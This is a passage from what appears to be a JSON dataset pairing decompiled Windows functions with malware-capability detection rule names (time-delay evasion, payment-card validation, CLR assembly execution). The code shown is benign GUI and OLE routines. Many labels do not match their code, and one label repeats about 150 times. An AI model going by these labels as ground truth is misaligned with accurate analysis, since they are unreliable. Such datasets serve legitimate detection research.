            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00462421(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00469f64(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "00412d4a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412d4a(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    iVar3 = (*_sym.imp.ole32.dll_ReadClassStg)(arg_8h, &var_14h);\n    if (iVar3 != 0) goto code_r0x00412e09;\n    var_20h = 0;\n    (*_sym.imp.ole32.dll_ReadFmtUserTypeStg)(arg_8h, &var_28h, &var_20h);\n    var_24h = 0;\n    var_18h = NULL;\n    iVar3 = (*_sym.imp.ole32.dll_OleRegGetUserType)(arg_ch, 1, &var_18h);\n    pcVar1 = _sym.imp.ole32.dll_WriteClassStg;\n    if (iVar3 != 0) {\n        var_18h = &var_24h;\n    }\n    var_1ch = (*_sym.imp.ole32.dll_WriteClassStg)(arg_8h, arg_ch);\n    pcVar2 = _sym.imp.ole32.dll_WriteFmtUserTypeStg;\n    if (var_1ch == 0) {\n        var_1ch = (*_sym.imp.ole32.dll_WriteFmtUserTypeStg)(arg_8h, var_28h, var_18h);\n        if (var_1ch == 0) {\n            var_1ch = (*_sym.imp.ole32.dll_SetConvertStg)(arg_8h, 1);\n            if (var_1ch == 0) goto code_r0x00412dee;\n        }\n        (*pcVar1)(arg_8h, &var_14h);\n        (*pcVar2)(arg_8h, var_28h, var_20h);\n    }\ncode_r0x00412dee:\n    pcVar1 = _sym.imp.ole32.dll_CoTaskMemFree;\n    if (var_18h != &var_24h) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(var_18h);\n    }\n    (*pcVar1)(var_20h);\ncode_r0x00412e09:\n    fcn.0045e747(unaff_ESI);\n    return;\n}\n",
        "token_count": 599
    },
    "004172b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004172b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    int32_t var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0041723d(arg_8h, &var_8h, &var_4h);\n    iVar1 = fcn.004162eb(arg_8h, &var_24h, 2);\n    if (iVar1 != 0) {\n        var_4h = var_4h - (-(var_14h != 1) & var_14h - 1U);\n    }\n    return var_4h;\n}\n",
        "token_count": 160
    },
    "0041d9e6": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041d9e6(int32_t hgdiobj)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    uint lpvObject;\n    int32_t var_30h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0x18, &lpvObject);\n    piVar1 = in_ECX + 0x27;\n    if (*piVar1 == 0) {\n        var_8h = 0;\n        var_4h = hgdiobj;\n        iVar2 = (**(*in_ECX + 0x110))(0x413, var_30h / in_ECX[0x29], &var_8h);\n        uVar3 = iVar2 == 0;\n    }\n    else {\n        var_ch = var_30h / in_ECX[0x29];\n        var_1ch = 0;\n        var_14h = 0;\n        var_10h = hgdiobj;\n        var_18h = *piVar1;\n        uVar3 = (**(*in_ECX + 0x110))(0x42e, 0, &var_1ch);\n    }\n    if (uVar3 != 0) {\n        fcn.004304c2(piVar1);\n        *piVar1 = hgdiobj;\n    }\n    return uVar3;\n}\n",
        "token_count": 382
    },
    "004202f9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004202f9(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_ECX;\n    if (arg_8h != NULL) goto code_r0x00420313;\n    do {\n        fcn.00411e42();\ncode_r0x00420313:\n    } while (*arg_8h == 0);\n    piVar1 = fcn.0042f4a6();\n    if (piVar1 != NULL) {\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        iVar2 = (**(*piVar1 + 0x54))(0, 0, 0x50800000, &var_14h, var_4h, arg_ch, arg_8h);\n        if (iVar2 != 0) {\n            uVar3 = fcn.0041be4f();\n            if ((uVar3 & 0x200) == 0) {\n                return piVar1;\n            }\n            fcn.0041be93(0x200, 0, 0x20);\n            return piVar1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 343
    },
    "0042134a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042134a(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (in_ECX[0x32] == 0) {\n        uVar1 = in_ECX[0x34];\n        in_ECX[0x32] = 1;\n        if ((uVar1 & 4) != 0) {\n            arg_8h = 1;\n        }\n        in_ECX[0x34] = uVar1 & 0xfffffff3;\n        if ((arg_8h != 0) && (in_ECX[0x20] != NULL)) {\n            (**(*in_ECX[0x20] + 0x50))();\n        }\n        uVar1 = fcn.0041be35();\n        if ((uVar1 & 0x2000) == 0) {\n            fcn.004189b9(0, 0xffff, 0xe900, 2, in_ECX + 0x1c, 0, 1);\n        }\n        else {\n            var_8h = 0x7fff;\n            var_4h = 0x7fff;\n            var_10h = 0;\n            var_ch = 0;\n            fcn.004189b9(0, 0xffff, 0xe900, 1, &var_10h, &var_10h, 0);\n            fcn.004189b9(0, 0xffff, 0xe900, 2, in_ECX + 0x1c, &var_10h, 1);\n            (**(*in_ECX + 0x68))(&var_10h, 0);\n            fcn.0041c2a1(0, 0, 0, var_8h - var_10h, var_4h - var_ch, 0x16);\n        }\n        in_ECX[0x32] = 0;\n    }\n    return;\n}\n",
        "token_count": 484
    },
    "00432f3a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00432f3a(void)\n\n{\n    uint arg_8h;\n    uint var_18h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    arg_8h = (*_sym.imp.KERNEL32.dll_GetOEMCP)(&var_18h);\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 112
    },
    "004355d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004355d0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    \n    var_24h = arg_8h;\n    var_28h = 0x18;\n    var_1ch = 0xf000;\n    var_20h = ((arg_ch != 0) + 1) * 0x1000;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x110d, 0, &var_28h);\n    return;\n}\n",
        "token_count": 161
    },
    "004378d1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004378d1(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(in_ECX + 0xac);\n    puVar1 = in_ECX + 0xb0;\n    uVar2 = *puVar1;\n    uVar3 = *(in_ECX + 0xb4);\n    uVar4 = *(in_ECX + 0xb8);\n    uVar5 = *(in_ECX + 0xbc);\n    *(in_ECX + 0xac) = *arg_ch == 0;\n    (*_sym.imp.USER32.dll_CopyRect)(puVar1, arg_ch + 1);\n    fcn.00433d84(arg_8h, arg_ch);\n    *puVar1 = uVar2;\n    *(in_ECX + 0xb4) = uVar3;\n    *(in_ECX + 0xb8) = uVar4;\n    *(in_ECX + 0xbc) = uVar5;\n    *(in_ECX + 0xac) = uVar6;\n    return;\n}\n",
        "token_count": 305
    },
    "00438dc4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: lprcSrc1\n\nvoid __cdecl\nfcn.00438dc4(uint lprcSrc2, uint dx, uint dy, uint lprcSrc, uint arg_18h, uint arg_1ch, uint arg_20h, uint arg_24h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t unaff_EBP;\n    uint lprcSrc1;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x38);\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x34) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x2c) = vtable.CRgn.0;\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x24) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.00435d44(*(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x44, *(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_InflateRect)(unaff_EBP + -0x44, -*(unaff_EBP + 0xc), -*(unaff_EBP + 0x10));\n    (*_sym.imp.USER32.dll_IntersectRect)(unaff_EBP + -0x44, unaff_EBP + -0x44, *(unaff_EBP + 8));\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(unaff_EBP + -0x44);\n    fcn.0042e438(uVar2);\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n    fcn.0042e438(uVar2);\n    fcn.00438b99(unaff_EBP + -0x2c, unaff_EBP + -0x24, 3);\n    if (*(unaff_EBP + 0x20) == 0) {\n        uVar2 = fcn.00438d21();\n        *(unaff_EBP + 0x20) = uVar2;\n    }\n    iVar3 = *(unaff_EBP + 0x20);\n    if (iVar3 == 0) {\n        fcn.00411e42();\n        iVar3 = extraout_ECX_00;\n    }\n    if (*(unaff_EBP + 0x24) == 0) {\n        *(unaff_EBP + 0x24) = iVar3;\n    }\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CRgn.0;\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 4;\n    pcVar1 = _sym.imp.GDI32.dll_CreateRectRgn;\n    if (*(unaff_EBP + 0x14) != 0) {\n        uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n        fcn.0042e438(uVar2);\n        fcn.00438b7e(*(unaff_EBP + 0x14));\n        (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x44, *(unaff_EBP + 0x14));\n        (*_sym.imp.USER32.dll_InflateRect)(unaff_EBP + -0x44, -*(unaff_EBP + 0x18), -*(unaff_EBP + 0x1c));\n        (*_sym.imp.USER32.dll_IntersectRect)(unaff_EBP + -0x44, unaff_EBP + -0x44, *(unaff_EBP + 0x14));\n        fcn.00438b7e(unaff_EBP + -0x44);\n        fcn.00438b99(unaff_EBP + -0x2c, unaff_EBP + -0x24, 3);\n        if (*(*(unaff_EBP + 0x20) + 4) == *(*(unaff_EBP + 0x24) + 4)) {\n            uVar2 = (*pcVar1)(0, 0, 0, 0);\n            fcn.0042e438(uVar2);\n            fcn.00438b99(unaff_EBP + -0x1c, unaff_EBP + -0x34, 3);\n        }\n    }\n    pcVar1 = _sym.imp.GDI32.dll_PatBlt;\n    if ((*(*(unaff_EBP + 0x20) + 4) != *(*(unaff_EBP + 0x24) + 4)) && (*(unaff_EBP + 0x14) != 0)) {\n        fcn.0042dd0d(unaff_EBP + -0x1c);\n        (**(*extraout_ECX + 0x50))(unaff_EBP + -0x44);\n        uVar2 = fcn.0042e5d1(*(unaff_EBP + 0x24));\n        *(unaff_EBP + 0x14) = uVar2;\n        (*pcVar1)(extraout_ECX[1], *(unaff_EBP + -0x44), *(unaff_EBP + -0x40), \n                  *(unaff_EBP + -0x3c) - *(unaff_EBP + -0x44), *(unaff_EBP + -0x38) - *(unaff_EBP + -0x40), 0x5a0049);\n        fcn.0042e5d1(*(unaff_EBP + 0x14));\n    }\n    iVar3 = unaff_EBP + -0x14;\n    if (*(unaff_EBP + -0x10) == 0) {\n        iVar3 = unaff_EBP + -0x34;\n    }\n    fcn.0042dd0d(iVar3);\n    (**(*extraout_ECX + 0x50))(unaff_EBP + -0x44);\n    uVar2 = fcn.0042e5d1(*(unaff_EBP + 0x20));\n    *(unaff_EBP + 0x14) = uVar2;\n    (*pcVar1)(extraout_ECX[1], *(unaff_EBP + -0x44), *(unaff_EBP + -0x40), *(unaff_EBP + -0x3c) - *(unaff_EBP + -0x44), \n              *(unaff_EBP + -0x38) - *(unaff_EBP + -0x40), 0x5a0049);\n    if (*(unaff_EBP + 0x14) != 0) {\n        fcn.0042e5d1(*(unaff_EBP + 0x14));\n    }\n    fcn.0042dd0d(0);\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x14) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x24) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x34) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 2224
    },
